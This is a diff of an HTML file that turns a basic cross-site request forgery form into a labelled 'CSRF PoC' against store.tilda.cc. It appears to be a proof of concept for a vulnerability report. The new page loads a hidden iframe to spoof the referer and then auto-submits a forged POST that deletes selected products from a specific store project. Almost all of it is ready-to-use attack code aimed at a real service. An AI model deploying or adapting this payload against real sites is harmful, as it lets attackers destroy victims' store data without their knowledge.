@@ -1,9 +1,27 @@
+<!DOCTYPE html>
 <html>
-	<body>
-		<form method="POST" action="https://tilda.cc/identity/submit/">
-			<input type="hidden" name="comm" value="settrial"/>
-			<input type="hidden" name="csrf" value="err.%20is%20empty.%20"/>
-			<input type="submit" value="Submit">
-		</form>
-	</body>
-<html>
+<head>
+    <title>CSRF PoC</title>
+</head>
+<body>
+<h3>CSRF PoC – store.tilda.cc</h3>
+
+<!-- Step 1: Create a hidden iframe to load the spoofed referer URL -->
+<iframe id="spoof" src="https://anything@store.tilda.cc/" style="display:none;"></iframe>
+
+<!-- Step 2: Auto-submit the forged POST request -->
+<form id="csrfForm" action="https://store.tilda.cc/store/submit/" method="POST">
+    <input type="hidden" name="comm" value="delproductsselected">
+    <input type="hidden" name="projectid" value="15812966">
+    <input type="hidden" name="productsids" value="582141405642,">
+</form>
+
+<script>
+// Wait a moment to let the referer spoof load
+setTimeout(function () {
+    document.getElementById('csrfForm').submit();
+}, 1500);
+</script>
+
+</body>
+</html>
